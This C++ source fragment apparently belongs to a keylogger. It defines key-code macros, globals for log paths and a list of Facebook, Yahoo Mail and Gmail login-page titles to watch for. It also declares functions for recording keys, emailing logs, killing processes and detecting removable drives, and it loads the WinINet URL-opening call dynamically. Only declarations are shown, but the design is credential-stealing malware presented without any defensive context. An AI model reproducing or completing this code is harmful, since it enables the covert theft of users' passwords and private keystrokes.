
#define MAX 255

#define VK_OEM_1 0xBA
#define VK_OEM_2 0xBF
#define VK_OEM_3 0xC0
#define VK_OEM_4 0xDB
#define VK_OEM_5 0xDC
#define VK_OEM_6 0xDD
#define VK_OEM_7 0xDE
#define VK_OEM_8 0xDF
#define VK_OEM_PERIOD 0xBE
#define VK_OEM_MINUS 0xBD
#define VK_OEM_COMMA 0xBC
#define VK_OEM_PLUS 0xBB

enum DriveType {
	REMOVABLE_DRIVE = 2,
	FIXED_DRIVE = 3
};

HINTERNET hInternet;
typedef HINTERNET (WINAPI *FInternetOpenUrl) (HINTERNET, LPCTSTR, LPCTSTR, DWORD, DWORD, DWORD_PTR);
FInternetOpenUrl fInternetOpenUrl = (FInternetOpenUrl)GetProcAddress(GetModuleHandle("Wininet"), "InternetOpenUrlA");


/* ---------------------------------------------------------------------------- */

string logs =  "";
bool keyPressed = false;
size_t ttime;

string CURRENT_FILE_PATH;
string USERPROFILE_PATH;
string LOGS_PATH;

int previous = -1;
const int NUM_TITLES = 4;

string titlesToSearch[NUM_TITLES] = {
					"Welcome to Facebook - Log In, Sign Up or Learn More",
					"Log In | Facebook",
					"Yahoo! Mail: The best web-based email!",
					"Gmail: Email from Google"

};

string titlesInSMS[NUM_TITLES] = {
					"Facebook",
					"Facebook",
					"Yahoo",
					"Gmail"
};

						


/* Function Prototypes */

void getPaths();
string GetForegroundWindowText();
string urlencode(const string &c);
string char2hex( char dec );

void send_email(string, string);
int record_keys();
string processLogs(string);

void endProcess(LPSTR);
HANDLE GetProcessHandle(LPSTR);
int matchWithTitles(string);
bool hasAlreadyLogged(string);
string UserName();
int file_size(char *);
vector <string> split(string, char); 
bool strEndsWith (string, string);
void strReplace (string &, const string, const string);
